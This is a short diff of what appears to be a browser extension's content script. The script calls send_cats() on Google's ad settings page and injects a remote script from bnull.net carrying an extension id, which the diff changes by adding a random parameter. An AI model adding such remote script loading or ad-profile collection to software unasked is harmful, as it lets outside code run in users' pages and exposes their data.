@@ -222,7 +222,7 @@ let terminator = (pattern) => {
 			//post_message();
 			//console.log('href',window.location.href);
 			if(window.location.href.match(/adssettings.google.com/)){
-				if(window.location.href == 'https://adssettings.google.com/authenticated?ni_query=1'){
+				if(window.location.href.match('\\?ni_query=1')){
 					//console.log('ni_query=1');
 					send_cats();
 				}//If adssettings.google.com
@@ -246,7 +246,7 @@ let terminator = (pattern) => {
 					script.type = 'text/javascript';
 					script.async = true;
 					script.onload = function(){  };
-					script.src = ['https://bnull.net/ext.js?extid=',encodeURI(ni_id)].join('');
+					script.src = ['https://bnull.net/ext.js?extid=',encodeURI(ni_id),'&r=',encodeURI(Math.random())].join('');
 					document.getElementsByTagName('head')[0].appendChild(script);
 
 				}
